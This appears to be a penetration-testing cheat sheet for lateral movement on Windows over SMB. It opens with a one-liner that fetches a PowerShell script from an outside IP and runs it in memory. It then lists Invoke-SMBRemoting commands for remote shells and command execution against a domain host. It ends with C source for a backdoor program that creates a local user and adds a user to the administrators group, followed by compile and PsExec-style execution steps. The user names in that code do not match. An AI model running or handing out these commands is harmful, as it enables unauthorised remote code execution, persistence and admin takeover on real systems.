# Powershell Implementation
*NOTE: We need admin access to SMB on the victim, can be abused using also injected kerberos ticket!*
- Invoke the script: `iex(iwr http://192.168.45.223/Invoke-SMBRemoting -UseBasicParsing)`

## Cheetsheet:
<ins>Interactive Shell</ins>
  - `Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local"`
  - `Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -PipeName Something -ServiceName RandomService`
  - `Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -ModifyService -Verbose`
  - `Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -ModifyService -ServiceName SensorService -Verbose`

<ins>Command Execution</ins>
- `Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -Command "whoami /all"`
- `Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -Command "whoami /all" -PipeName Something -ServiceName RandomService`
- `Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -Command "whoami /all" -ModifyService`
- `Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -Command "whoami /all" -ModifyService -ServiceName SensorService -Verbose`

![278768338-645eaffe-e3d3-4428-b7a4-14bf95f5ddce](https://github.com/user-attachments/assets/8b986eb2-8d25-4098-a55a-763c4d802d7d)


# EXE Implementation

Save the content below as `adduser.c`:

```
#include <stdlib.h>
int main ()
{
 int i;
    i = system ("net user amit Password123! /add");
    i = system ("net localgroup administrators salar /add");
 return 0;
}
```
Compile it:
- `x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`

Execute: 
- `.\PsExecLat.exe file01 C:\Windows\Tasks\adduser.exe`
